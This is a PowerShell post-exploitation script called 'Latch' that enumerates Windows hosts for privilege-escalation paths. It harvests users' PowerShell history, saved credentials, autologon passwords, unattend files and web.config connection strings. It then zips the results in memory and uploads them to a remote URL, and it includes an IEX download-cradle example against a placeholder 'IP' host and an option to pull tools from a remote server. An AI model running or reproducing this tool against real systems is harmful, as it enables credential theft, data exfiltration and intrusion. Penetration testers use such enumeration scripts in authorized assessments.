#Requires -Version 2.0
<#
.SYNOPSIS
    Latch - Windows Privilege Escalation Enumeration
.DESCRIPTION
    Collects system configuration data for review.
    Fileless mode by default when -Upload is specified.
.PARAMETER Upload
    URL to upload results to. Enables fileless mode by default.
.PARAMETER SaveLocal
    Force saving to disk even when -Upload is specified.
.EXAMPLE
    # Fileless execution via IEX
    IEX(New-Object Net.WebClient).DownloadString('http://IP/Latch.ps1'); Invoke-Latch -Upload http://IP:8000/upload
.EXAMPLE
    # Direct execution with upload
    .\Latch.ps1 -Upload http://IP:8000/upload
.EXAMPLE
    # Save to disk only
    .\Latch.ps1
.NOTES
    For authorized use only.
#>

function Invoke-Latch {
    param(
        [string]$OutputDir = ".\LatchOutput",
        [string]$RemoteHost = "",
        [string]$DownloadTools = "",
        [string]$ToolsDir = "",
        [switch]$SkipSlowScans,
        [switch]$Quiet,
        [switch]$Cleanup,
        [switch]$Zip,
        [string]$Upload = "",
        [switch]$SaveLocal
    )

    $ErrorActionPreference = "SilentlyContinue"
    $ProgressPreference = "SilentlyContinue"
    $TotalSteps = 16
    $CurrentStep = 0

    # Fileless mode: upload specified but no SaveLocal flag
    $FilelessMode = ($Upload -and -not $SaveLocal)
    $OutputData = @{}
    $CriticalFindings = @()

    # =========================================================================
    # HELPER FUNCTIONS
    # =========================================================================

    function Write-Status {
        param([string]$Message, [string]$Type = "INFO")
        if ($Quiet -and $Type -eq "INFO") { return }
        $timestamp = Get-Date -Format "HH:mm:ss"
        $pct = [math]::Round(($CurrentStep / $TotalSteps) * 100)
        switch ($Type) {
            "INFO"    { Write-Host "[$timestamp][$pct%] [*] $Message" -ForegroundColor Cyan }
            "SUCCESS" { Write-Host "[$timestamp][$pct%] [+] $Message" -ForegroundColor Green }
            "WARNING" { Write-Host "[$timestamp][$pct%] [!] $Message" -ForegroundColor Yellow }
            "ERROR"   { Write-Host "[$timestamp][$pct%] [-] $Message" -ForegroundColor Red }
            "CRITICAL"{ Write-Host "[$timestamp][$pct%] [!!!] $Message" -ForegroundColor Magenta }
        }
    }

    function Test-IsAdmin {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    function Test-IsDomainJoined {
        try {
            $cs = Get-WmiObject -Class Win32_ComputerSystem
            return $cs.PartOfDomain
        } catch { return $false }
    }

    function Save-Output {
        param([string]$FileName, [string]$Content)
        if ($FilelessMode) {
            $OutputData[$FileName] = $Content
        } else {
            $Content | Out-File "$OutputDir\$FileName" -Encoding UTF8
        }
    }

    function Add-CriticalFinding {
        param([string]$FileName, [string]$Content, [string]$Description)
        if ($FilelessMode) {
            $OutputData[$FileName] = $Content
        } else {
            $Content | Out-File "$OutputDir\$FileName"
        }
        $script:CriticalFindings += $Description
    }

    # =========================================================================
    # BANNER
    # =========================================================================

    $IsAdmin = Test-IsAdmin
    $IsDomain = Test-IsDomainJoined
    $AdminStatus = if ($IsAdmin) { "YES" } else { "NO" }
    $DomainStatus = if ($IsDomain) { "YES" } else { "NO" }
    $ModeStatus = if ($FilelessMode) { "FILELESS" } else { "DISK" }

    Write-Host @"
==============================================================
    Latch - Windows PrivEsc Enumeration
    Mode: $ModeStatus | Admin: $AdminStatus | Domain: $DomainStatus
==============================================================
"@ -ForegroundColor Yellow

    if (-not $IsAdmin) {
        Write-Host "[!] Not running as admin - some checks will be limited" -ForegroundColor Yellow
    }

    if (-not $FilelessMode) {
        if (-not (Test-Path $OutputDir)) {
            New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
        }
        Write-Host "[*] Output: $OutputDir" -ForegroundColor Cyan
    } else {
        Write-Host "[*] Output: Memory only (upload to $Upload)" -ForegroundColor Cyan
    }

    # =========================================================================
    # SECTION 1: SYSTEM INFORMATION
    # =========================================================================
    $CurrentStep++
    Write-Status "Gathering system information..."

    $sysinfo = @"
=== CURRENT USER ===
$(whoami)

=== USER GROUPS ===
$(whoami /groups)

=== USER PRIVILEGES ===
$(whoami /priv)

=== SYSTEM INFO ===
$(systeminfo)

=== ENVIRONMENT VARIABLES ===
$(Get-ChildItem Env: | Format-Table Name, Value -AutoSize | Out-String -Width 300)

=== LOCAL USERS ===
$(Get-LocalUser 2>&1 | Format-Table | Out-String)

=== LOCAL GROUPS ===
$(Get-LocalGroup 2>&1 | Format-Table | Out-String)

=== ADMINISTRATORS GROUP ===
$(net localgroup administrators 2>&1)

=== ALL USERS (net user) ===
$(net user 2>&1)
"@
    Save-Output "sysinfo.txt" $sysinfo
    Write-Status "System info collected" "SUCCESS"

    # Check for dangerous privileges
    $privs = whoami /priv
    if ($privs -match "SeImpersonatePrivilege.*Enabled" -or $privs -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
        Write-Status "FOUND: SeImpersonate or SeAssignPrimaryToken enabled!" "CRITICAL"
        Add-CriticalFinding "TOKEN_PRIVS_FOUND.txt" "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege ENABLED - Token impersonation possible" "Token privileges - check sysinfo.txt"
    }

    # =========================================================================
    # SECTION 2: NETWORK INFORMATION
    # =========================================================================
    $CurrentStep++
    Write-Status "Gathering network information..."

    $network = @"
=== IP CONFIGURATION ===
$(ipconfig /all)

=== LISTENING PORTS ===
$(netstat -ano | findstr LISTENING)

=== ESTABLISHED CONNECTIONS ===
$(netstat -ano | findstr ESTABLISHED)

=== ROUTING TABLE ===
$(route print)

=== ARP CACHE ===
$(arp -a)

=== DNS CACHE ===
$(ipconfig /displaydns 2>&1 | Select-Object -First 100 | Out-String)

=== NETWORK SHARES ===
$(net share 2>&1)

=== MAPPED DRIVES ===
$(net use 2>&1)

=== FIREWALL STATE ===
$(netsh advfirewall show allprofiles state 2>&1)

=== LOCALHOST-ONLY PORTS ===
$(netstat -ano | findstr "127.0.0.1:" | findstr LISTENING)
"@
    Save-Output "network.txt" $network
    Write-Status "Network info collected" "SUCCESS"

    # =========================================================================
    # SECTION 3: INSTALLED PATCHES
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking installed patches..."

    $patches = @"
=== INSTALLED HOTFIXES ===
$(Get-HotFix | Sort-Object InstalledOn -Descending | Format-Table -AutoSize | Out-String)

=== WMIC QUICK FIX ===
$(wmic qfe list brief 2>&1)
"@
    Save-Output "patches.txt" $patches
    Write-Status "Patches collected" "SUCCESS"

    # =========================================================================
    # SECTION 4: QUICK WINS CHECK
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking quick win locations..."

    $quickwins = @"
=== POWERSHELL HISTORY (CURRENT USER) ===
$(Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>&1)

=== POWERSHELL HISTORY (ALL USERS) ===
$(Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>&1 | ForEach-Object { "=== $($_.FullName) ==="; Get-Content $_.FullName 2>&1 } | Out-String)

=== SAVED CREDENTIALS (cmdkey) ===
$(cmdkey /list 2>&1)

=== AUTOLOGON REGISTRY ===
DefaultUserName: $(reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>&1 | Select-String "DefaultUserName")
DefaultPassword: $(reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>&1 | Select-String "DefaultPassword")
"@
    Save-Output "quickwins.txt" $quickwins
    Write-Status "Quick wins collected" "SUCCESS"

    # =========================================================================
    # SECTION 5: UNATTEND FILES
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking for unattend files..."

    $unattendPaths = @(
        "C:\Unattend.xml",
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattend\Unattend.xml",
        "C:\Windows\system32\sysprep\sysprep.xml",
        "C:\Windows\system32\sysprep.inf"
    )

    $unattendOut = "=== UNATTEND/SYSPREP FILES ===`n"
    foreach ($path in $unattendPaths) {
        if (Test-Path $path) {
            $unattendOut += "`n=== FOUND: $path ===`n"
            $unattendOut += (Get-Content $path | Out-String)
            Write-Status "FOUND: $path" "CRITICAL"
        }
    }

    $unattendOut += "`n=== UNATTEND FILE SEARCH ===`n"
    $foundUnattend = Get-ChildItem -Path C:\ -Recurse -Include *unattend*.xml,*sysprep*.xml -ErrorAction SilentlyContinue 2>$null | Select-Object -ExpandProperty FullName
    if ($foundUnattend) {
        $unattendOut += ($foundUnattend -join "`n")
    }

    Save-Output "unattend.txt" $unattendOut
    Write-Status "Unattend check collected" "SUCCESS"

    # =========================================================================
    # SECTION 6: WEB CONFIG FILES
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking for web config files..."

    $webconfigs = @"
=== IIS WEB.CONFIG FILES ===
$(Get-ChildItem -Path C:\inetpub -Recurse -Include web.config 2>&1 | ForEach-Object { "=== $($_.FullName) ==="; Get-Content $_.FullName 2>&1 } | Out-String)

=== .NET FRAMEWORK WEB.CONFIG ===
$(Get-Content "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" -ErrorAction SilentlyContinue | Out-String)

=== COMMON WEB PATHS ===
$(Get-ChildItem -Path "C:\xampp","C:\wamp","C:\Apache","C:\nginx" -Recurse -Include *.conf,*.config,web.config 2>&1 | Select-Object FullName | Out-String)

=== CONNECTION STRING SEARCH (INETPUB) ===
$(Select-String -Path "C:\inetpub\*.config" -Pattern "connectionString" -ErrorAction SilentlyContinue | Out-String)
"@
    Save-Output "webconfigs.txt" $webconfigs
    Write-Status "Web configs collected" "SUCCESS"

    # =========================================================================
    # SECTION 7: SERVICES
    # =========================================================================
    $CurrentStep++
    Write-Status "Enumerating services..."

    $services = Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartName, State, StartMode

    $nonStandard = $services | Where-Object {
        $_.PathName -and
        $_.PathName -notlike "*System32*" -and
        $_.PathName -notlike "*SysWOW64*" -and
        $_.PathName -notlike "*Windows*"
    }
    Save-Output "services_nonstandard.txt" ($nonStandard | Format-Table -AutoSize | Out-String)
    Save-Output "services_detailed.txt" ($services | Format-Table -AutoSize | Out-String)
    Write-Status "Services collected" "SUCCESS"

    # Check for unquoted paths
    $unquoted = $services | Where-Object {
        $_.PathName -and
        $_.PathName -notlike '"*' -and
        $_.PathName -like '* *' -and
        $_.PathName -notlike 'C:\Windows\*'
    }
    if ($unquoted) {
        Write-Status "FOUND: Unquoted service paths!" "CRITICAL"
        Save-Output "unquoted_paths.txt" ($unquoted | Format-Table Name, PathName -AutoSize | Out-String)
        Add-CriticalFinding "UNQUOTED_PATHS_FOUND.txt" "Unquoted service paths found - potential privilege escalation" "Unquoted paths - check unquoted_paths.txt"
    }

    # =========================================================================
    # SECTION 8: SCHEDULED TASKS
    # =========================================================================
    $CurrentStep++
    Write-Status "Enumerating scheduled tasks..."

    $tasks = schtasks /query /fo CSV /v 2>&1 | ConvertFrom-Csv
    $privTasks = $tasks | Where-Object { $_."Run As User" -like "*SYSTEM*" -or $_."Run As User" -like "*Admin*" } |
        Select-Object TaskName, "Run As User", "Task To Run" |
        Format-Table -AutoSize | Out-String
    Save-Output "schtasks_privileged.txt" $privTasks
    Save-Output "schtasks_full.txt" (schtasks /query /fo LIST /v 2>&1 | Out-String)
    Write-Status "Scheduled tasks collected" "SUCCESS"

    # =========================================================================
    # SECTION 9: AUTORUNS
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking autorun locations..."

    $autoruns = @"
=== HKLM RUN ===
$(reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>&1)

=== HKCU RUN ===
$(reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>&1)

=== STARTUP FOLDERS ===
All Users: $(Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1 | Select-Object Name | Out-String)
Current User: $(Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1 | Select-Object Name | Out-String)

=== STARTUP FOLDER PERMISSIONS ===
$(icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 2>&1)
"@
    Save-Output "autoruns.txt" $autoruns
    Write-Status "Autoruns collected" "SUCCESS"

    # =========================================================================
    # SECTION 10: ALWAYS INSTALL ELEVATED
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking AlwaysInstallElevated..."

    $aie = @"
=== ALWAYSINSTALLELEVATED CHECK ===
HKLM: $(reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1)
HKCU: $(reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1)
"@
    Save-Output "alwaysinstallelevated.txt" $aie

    if ($aie -match "0x1") {
        Write-Status "FOUND: AlwaysInstallElevated is enabled!" "CRITICAL"
        Add-CriticalFinding "MSI_ELEVATED_FOUND.txt" "AlwaysInstallElevated ENABLED - can install MSI as SYSTEM" "AlwaysInstallElevated - MSI privesc possible"
    }
    Write-Status "AlwaysInstallElevated check collected" "SUCCESS"

    # =========================================================================
    # SECTION 11: INSTALLED SOFTWARE
    # =========================================================================
    $CurrentStep++
    Write-Status "Enumerating installed software..."

    $software = @"
=== INSTALLED SOFTWARE (REGISTRY) ===
$(Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* 2>&1 | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize | Out-String)

=== 32-BIT SOFTWARE ===
$(Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* 2>&1 | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize | Out-String)
"@
    Save-Output "software.txt" $software
    Write-Status "Software list collected" "SUCCESS"

    # =========================================================================
    # SECTION 12: RUNNING PROCESSES
    # =========================================================================
    $CurrentStep++
    Write-Status "Enumerating processes..."

    $procs = @"
=== RUNNING PROCESSES ===
$(Get-Process | Select-Object Id, ProcessName, Path | Format-Table -AutoSize | Out-String)

=== PROCESSES WITH PATHS ===
$(Get-WmiObject Win32_Process | Select-Object ProcessId, Name, ExecutablePath | Format-Table -AutoSize | Out-String)
"@
    Save-Output "processes.txt" $procs
    Write-Status "Processes collected" "SUCCESS"

    # =========================================================================
    # SECTION 13: DLL HIJACKING CHECK
    # =========================================================================
    $CurrentStep++
    Write-Status "Checking PATH for writable directories..."

    $pathDirs = $env:PATH -split ';'
    $writablePaths = @()
    foreach ($dir in $pathDirs) {
        if ($dir -and (Test-Path $dir)) {
            try {
                $testFile = Join-Path $dir "test_$([guid]::NewGuid()).tmp"
                [IO.File]::Create($testFile).Close()
                Remove-Item $testFile -Force
                $writablePaths += $dir
            } catch { }
        }
    }

    $dllOut = "=== WRITABLE PATH DIRECTORIES ===`n"
    if ($writablePaths.Count -gt 0) {
        $dllOut += ($writablePaths -join "`n")
        Write-Status "FOUND: $($writablePaths.Count) writable PATH directories" "WARNING"
    } else {
        $dllOut += "No writable directories found in PATH"
    }
    Save-Output "dll_hijack.txt" $dllOut
    Write-Status "DLL hijack check collected" "SUCCESS"

    # =========================================================================
    # SECTION 14: DIRECTORY TREE
    # =========================================================================
    $CurrentStep++
    Write-Status "Generating directory trees..."

    $tree = @"
=== C:\USERS TREE ===
$(tree C:\Users /F 2>&1 | Select-Object -First 200 | Out-String)

=== C:\PROGRAM FILES ===
$(Get-ChildItem "C:\Program Files" -ErrorAction SilentlyContinue | Select-Object Name | Out-String)

=== C:\PROGRAM FILES (X86) ===
$(Get-ChildItem "C:\Program Files (x86)" -ErrorAction SilentlyContinue | Select-Object Name | Out-String)

=== C:\INETPUB TREE ===
$(if (Test-Path "C:\inetpub") { tree "C:\inetpub" /F 2>&1 | Select-Object -First 150 | Out-String } else { "inetpub not found" })
"@
    Save-Output "tree_all.txt" $tree
    Write-Status "Directory tree collected" "SUCCESS"

    # =========================================================================
    # SECTION 15: DOWNLOAD TOOLS (OPTIONAL)
    # =========================================================================
    if ($DownloadTools -and $RemoteHost) {
        $CurrentStep++

        if (-not $ToolsDir) {
            $ToolsDir = Join-Path $env:TEMP "lt"
        }
        if (-not (Test-Path $ToolsDir)) {
            New-Item -ItemType Directory -Path $ToolsDir -Force | Out-Null
        }

        $category = $DownloadTools
        if ($category -eq "All" -or $category -eq "all") {
            $downloadPath = "all"
        } else {
            $downloadPath = "categories/$category"
        }

        Write-Status "Downloading tools to $ToolsDir from $RemoteHost/$downloadPath..."

        $wc = New-Object Net.WebClient
        $toolsDownloaded = 0

        try {
            $listUrl = "http://$RemoteHost/$downloadPath/"
            $html = $wc.DownloadString($listUrl)
            $pattern = 'href="([^"]+\.(exe|ps1|sh|py))"'
            $regexMatches = [regex]::Matches($html, $pattern)

            foreach ($match in $regexMatches) {
                $tool = $match.Groups[1].Value
                if ($tool -match "^\.\.?" -or $tool -match "^/") { continue }

                $toolPath = Join-Path $ToolsDir $tool
                try {
                    $url = "http://$RemoteHost/$downloadPath/$tool"
                    $wc.DownloadFile($url, $toolPath)
                    if ((Test-Path $toolPath) -and (Get-Item $toolPath).Length -gt 0) {
                        Write-Status "Downloaded $tool" "SUCCESS"
                        $toolsDownloaded++
                    }
                } catch {
                    Write-Status "Failed to download $tool" "WARNING"
                }
            }

            if ($toolsDownloaded -eq 0) {
                Write-Status "No tools found in $downloadPath" "WARNING"
            } else {
                Write-Status "Downloaded $toolsDownloaded tools to $ToolsDir" "SUCCESS"
            }
        } catch {
            Write-Status "Failed to fetch tool list from $RemoteHost/$downloadPath" "ERROR"
        }
    }

    # =========================================================================
    # SECTION 16: ZIP AND UPLOAD
    # =========================================================================
    $CurrentStep++

    $zipPath = "$OutputDir.zip"

    if ($FilelessMode) {
        # FILELESS MODE: Create zip in memory and upload directly
        Write-Status "Creating in-memory zip archive..."
        try {
            Add-Type -AssemblyName System.IO.Compression

            $memStream = New-Object System.IO.MemoryStream
            $zipArchive = New-Object System.IO.Compression.ZipArchive($memStream, [System.IO.Compression.ZipArchiveMode]::Create, $true)

            foreach ($fileName in $OutputData.Keys) {
                $entry = $zipArchive.CreateEntry($fileName)
                $entryStream = $entry.Open()
                $writer = New-Object System.IO.StreamWriter($entryStream)
                $writer.Write($OutputData[$fileName])
                $writer.Close()
                $entryStream.Close()
            }

            $zipArchive.Dispose()
            $zipBytes = $memStream.ToArray()
            $memStream.Close()

            Write-Status "Zip created in memory ($($zipBytes.Length) bytes)" "SUCCESS"

            Write-Status "Uploading to $Upload..."
            $wc = New-Object Net.WebClient
            $null = $wc.UploadData($Upload, "POST", $zipBytes)
            Write-Status "Upload complete (fileless)" "SUCCESS"

        } catch {
            Write-Status "Fileless upload failed: $_" "ERROR"
            Write-Status "Falling back to disk-based upload..." "WARNING"
            if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }
            foreach ($fileName in $OutputData.Keys) {
                $OutputData[$fileName] | Out-File "$OutputDir\$fileName" -Encoding UTF8
            }
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [IO.Compression.ZipFile]::CreateFromDirectory($OutputDir, $zipPath)
            $wc = New-Object Net.WebClient
            $null = $wc.UploadFile($Upload, $zipPath)
            Remove-Item -Path $OutputDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
            Write-Status "Fallback upload complete" "SUCCESS"
        }
    } else {
        # DISK MODE
        if ($Zip -or $Upload) {
            Write-Status "Creating zip archive..."
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [IO.Compression.ZipFile]::CreateFromDirectory($OutputDir, $zipPath)
                Write-Status "Created $zipPath" "SUCCESS"
            } catch {
                Compress-Archive -Path $OutputDir -DestinationPath $zipPath -Force
                Write-Status "Created $zipPath" "SUCCESS"
            }
        }

        if ($Upload) {
            Write-Status "Uploading results to $Upload..."
            try {
                $wc = New-Object Net.WebClient
                $null = $wc.UploadFile($Upload, $zipPath)
                Write-Status "Upload complete" "SUCCESS"
            } catch {
                Write-Status "Upload failed: $_" "ERROR"
            }
        }

        if ($Cleanup) {
            Write-Status "Cleaning up..."
            Remove-Item -Path $OutputDir -Recurse -Force -ErrorAction SilentlyContinue
            if ($Zip -or $Upload) {
                Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
            }
            Write-Status "Cleanup complete" "SUCCESS"
        }
    }

    # =========================================================================
    # SUMMARY
    # =========================================================================
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor Green
    Write-Host "  LATCH COMPLETE" -ForegroundColor Green
    Write-Host "============================================================" -ForegroundColor Green

    if ($FilelessMode) {
        Write-Host "  Mode: FILELESS (no files written to disk)" -ForegroundColor Yellow
        Write-Host "  Uploaded to: $Upload" -ForegroundColor Yellow
    } elseif ($Cleanup -and ($Zip -or $Upload)) {
        Write-Host "  Output: Cleaned up after upload" -ForegroundColor Yellow
    } elseif ($Cleanup) {
        Write-Host "  Output: Cleaned up" -ForegroundColor Yellow
    } else {
        Write-Host "  Output: $OutputDir" -ForegroundColor Yellow
    }
    Write-Host ""

    if ($CriticalFindings.Count -gt 0) {
        Write-Host "  CRITICAL FINDINGS:" -ForegroundColor Red
        foreach ($finding in $CriticalFindings) {
            Write-Host "    [!] $finding" -ForegroundColor Red
        }
        Write-Host ""
    }

    if (-not $FilelessMode -and -not $Cleanup) {
        Write-Host "  Review these files:" -ForegroundColor Cyan
        Write-Host "    type $OutputDir\sysinfo.txt"
        Write-Host "    type $OutputDir\quickwins.txt"
        Write-Host "    type $OutputDir\services_nonstandard.txt"
        Write-Host ""
    }
}

# =============================================================================
# AUTO-RUN: Execute if script is run directly (not IEX'd for function definition)
# =============================================================================
# When run directly: .\Latch.ps1 -Upload http://IP:8000/upload
# When IEX'd: IEX(...); Invoke-Latch -Upload http://IP:8000/upload
# =============================================================================

# Check if we have script-level parameters (run directly)
if ($MyInvocation.InvocationName -ne '.' -and $MyInvocation.InvocationName -ne '') {
    # Script was run directly, parse args and execute
    $params = @{}
    for ($i = 0; $i -lt $args.Count; $i++) {
        switch -Regex ($args[$i]) {
            '^-OutputDir$'      { $params['OutputDir'] = $args[++$i] }
            '^-RemoteHost$'     { $params['RemoteHost'] = $args[++$i] }
            '^-DownloadTools$'  { $params['DownloadTools'] = $args[++$i] }
            '^-ToolsDir$'       { $params['ToolsDir'] = $args[++$i] }
            '^-Upload$'         { $params['Upload'] = $args[++$i] }
            '^-SkipSlowScans$'  { $params['SkipSlowScans'] = $true }
            '^-Quiet$'          { $params['Quiet'] = $true }
            '^-Cleanup$'        { $params['Cleanup'] = $true }
            '^-Zip$'            { $params['Zip'] = $true }
            '^-SaveLocal$'      { $params['SaveLocal'] = $true }
        }
    }
    Invoke-Latch @params
}
